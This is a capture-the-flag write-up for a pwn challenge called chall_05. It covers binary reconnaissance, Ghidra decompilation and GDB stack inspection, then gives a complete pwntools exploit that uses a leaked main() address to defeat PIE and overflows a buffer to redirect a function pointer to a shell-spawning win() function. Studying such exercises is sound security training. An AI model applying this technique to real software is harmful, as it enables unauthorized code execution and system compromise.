# &#35; chall_05


#### &#42; purpose
1. find offset to input variable(local_48[56]) and *local_10
2. find leaked main() address
3. find pie_base address using leaked main() address
4. find win() = pie_base + win() offset
5. try to overwrite *local_10 with win()

#### &#42; execute
```bash
## 1 file
$ ls ./chall_05
./chall_05

## 64-bit LSB, dynamically linked and not stripped
$ file ./chall_05
./chall_05: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=472f1f983017c97b02b28f38c6bbe3e7ff6a98b3, for GNU/Linux 3.2.0, not stripped

## Full RELRO and PIE enabled
$ checksec --file=./chall_05
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   71) Symbols	  No	0		2		./chall_05

## just input twice and loop
$ ./chall_05
Race, life's greatest.
AAAAAAAA
Yes I'm going to win: 0x55cc10a591c0
BBBBBBB
Race, life's greatest.
AAAAAAAA
Yes I'm going to win: 0x55cc10a591c0
BBBBBBBB
Race, life's greatest.



```

#### &#42; decompile using ghidra
```bash
## vulerable point is fgets(local_48,100,stdin) and (*local_10)()
## need to calculate win() address because PIE is enabled.
void main(void)

{
  char local_28 [32];
  
  puts("Race, life\'s greatest.");
  fgets(local_28,19,stdin);
  vuln();
  return;
}

void vuln(void)

{
  char local_48 [56];
  code *local_10;
  
  printf("Yes I\'m going to win: %p\n",main);
  fgets(local_48,100,stdin);
  (*local_10)();
  return;
}

void win(void)

{
  system("/bin/sh");
  return;
}



## exploit structure
local_48[56] + local_10[win]

```


#### &#42; exploit step
```bash
1. pie_base = leak_main - main_offset
2. win = pie_base + win_offset
3. exploit just like chall_04

```



#### &#42; analysis binary using gdb
```bash

$ gdb ./chall_05 -q
GEF for linux ready, type `gef' to start, `gef config' to configure
94 commands loaded for GDB 9.2 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./chall_05...
(No debugging symbols found in ./chall_05)
gef???  disass main
Dump of assembler code for function main:
   0x000055c20c1211c0 <+0>:	endbr64
   0x000055c20c1211c4 <+4>:	push   rbp
   0x000055c20c1211c5 <+5>:	mov    rbp,rsp
   0x000055c20c1211c8 <+8>:	sub    rsp,0x20
   0x000055c20c1211cc <+12>:	lea    rdi,[rip+0xe39]        # 0x55c20c12200c
   0x000055c20c1211d3 <+19>:	call   0x55c20c121080 <puts@plt>
   0x000055c20c1211d8 <+24>:	mov    rdx,QWORD PTR [rip+0x2e31]        # 0x55c20c124010 <stdin@@GLIBC_2.2.5>
   0x000055c20c1211df <+31>:	lea    rax,[rbp-0x20]
   0x000055c20c1211e3 <+35>:	mov    esi,0x13
   0x000055c20c1211e8 <+40>:	mov    rdi,rax
   0x000055c20c1211eb <+43>:	call   0x55c20c1210b0 <fgets@plt>
   0x000055c20c1211f0 <+48>:	mov    eax,0x0
   0x000055c20c1211f5 <+53>:	call   0x55c20c1211fd <vuln>
   0x000055c20c1211fa <+58>:	nop
   0x000055c20c1211fb <+59>:	leave
   0x000055c20c1211fc <+60>:	ret
End of assembler dump.
gef???  disass vuln
Dump of assembler code for function vuln:
   0x000055c20c1211fd <+0>:	endbr64
   0x000055c20c121201 <+4>:	push   rbp
   0x000055c20c121202 <+5>:	mov    rbp,rsp
   0x000055c20c121205 <+8>:	sub    rsp,0x240
   0x000055c20c12120c <+15>:	lea    rsi,[rip+0xffffffffffffffad]        # 0x55c20c1211c0 <main>
   0x000055c20c121213 <+22>:	lea    rdi,[rip+0xe09]        # 0x55c20c122023
   0x000055c20c12121a <+29>:	mov    eax,0x0
   0x000055c20c12121f <+34>:	call   0x55c20c1210a0 <printf@plt>
   0x000055c20c121224 <+39>:	mov    rdx,QWORD PTR [rip+0x2de5]        # 0x55c20c124010 <stdin@@GLIBC_2.2.5>
   0x000055c20c12122b <+46>:	lea    rax,[rbp-0x40]
   0x000055c20c12122f <+50>:	mov    esi,0x64
   0x000055c20c121234 <+55>:	mov    rdi,rax
   0x000055c20c121237 <+58>:	call   0x55c20c1210b0 <fgets@plt>
   0x000055c20c12123c <+63>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x000055c20c121240 <+67>:	mov    eax,0x0
   0x000055c20c121245 <+72>:	call   rdx
   0x000055c20c121247 <+74>:	nop
   0x000055c20c121248 <+75>:	leave
   0x000055c20c121249 <+76>:	ret
End of assembler dump.
gef???

gef???  x/14xg $rbp-0x40
0x7fff588288e0:	0x4242424242424242	0x4242424242424242
0x7fff588288f0:	0x4242424242424242	0x4242424242424242
0x7fff58828900:	0x4242424242424242	0x4242424242424242
0x7fff58828910:	0x0a42424242424242	0x000055eeeae4c000
0x7fff58828920:	0x00007fff58828950	0x000055eeeae4c1fa
0x7fff58828930:	0x0000000a41414141	0x000055eeeae4c0c0
0x7fff58828940:	0x00007fff58828a40	0x0000000000000000
gef???



```

#### &#42; structure of stack
```bash
local_48[56] + local_10[calculated_win]


```

#### &#42; payload(python)
```python
payload  = b"A"*56
payload += p64(calculated_win)

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = 'chall_05'
conn = process(filename)
elf = ELF(filename)

'''
$ objdump -t ./chall_05 | grep win
00000000000011a9 g     F .text	0000000000000017              win
'''
#win_offset = 0x011a9
win_offset = elf.symbols["win"]

print( conn.recvuntil("\n") )

payload  = b"Z"*4
conn.sendline(payload)

'''
$ objdump -t ./chall_05 | grep main
00000000000011c0 g     F .text	000000000000003d              main
'''
#main_offset = 0x11c0
main_offset = elf.symbols["main"]

print( conn.recvuntil("win: ") )
#print( u64(int(conn.recv(14),16)) )
leak_main = conn.recv(14)
print( "main : " + hex(int(leak_main, 16)) )

pie_base = int(leak_main,16) - main_offset
print( "pie_base : " + hex(pie_base) )

with open("payload", "wb") as fd:
    fd.write(payload+"\n")


win = pie_base+win_offset

payload  = b"A"*56
payload +=p64(win)
print( hex(win) )

conn.send(payload)


with open("payload", "ab") as fd:
    fd.write(payload)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[!] Could not find executable 'chall_05' in $PATH, using './chall_05' instead
[+] Starting local process './chall_05': pid 3126
[*] '/pwn/sunshine/05/chall_05'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
Race, life's greatest.

Yes I'm going to win:
main : 0x555c7fa731c0
pie_base : 0x555c7fa72000
0x555c7fa731a9
[*] Switching to interactive mode

$
$ cat flag.txt
sun{chapter-four-9ca97769b74345b1}
$

```
